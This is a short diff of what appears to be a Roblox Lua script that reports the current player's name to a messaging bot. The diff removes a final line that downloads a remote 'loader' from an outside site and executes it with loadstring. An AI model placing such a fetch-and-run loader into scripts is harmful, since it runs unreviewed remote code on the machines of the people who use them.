@@ -69,5 +69,3 @@ while true do
         SendMessage(url, "the script has executed successfully\nCurrent User : " .. playerName .. "") -- the thing in quotation mark are the message the bot will send to, so change it
     end
 end
-
-loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();
